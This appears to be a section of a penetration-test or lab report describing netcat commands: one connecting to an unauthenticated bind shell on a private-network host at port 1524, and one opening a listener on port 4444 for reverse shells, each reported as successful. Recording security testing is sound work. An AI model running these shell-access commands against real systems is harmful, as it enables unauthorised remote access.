Netcat was used for manual interaction and verification
of shell access.

Commands Used:

1. Connecting to bind shell on port 1524:
nc 192.168.1.4 1524

Purpose:
To verify the presence of an unsecured bind shell and
obtain command-line access.

Result:
Shell access obtained without authentication.

--------------------------------------------------

2. Listener for reverse shell:
nc -lvnp 4444

Purpose:
To listen for incoming reverse shell connections during
exploitation.

Result:
Successful connection received from target system.
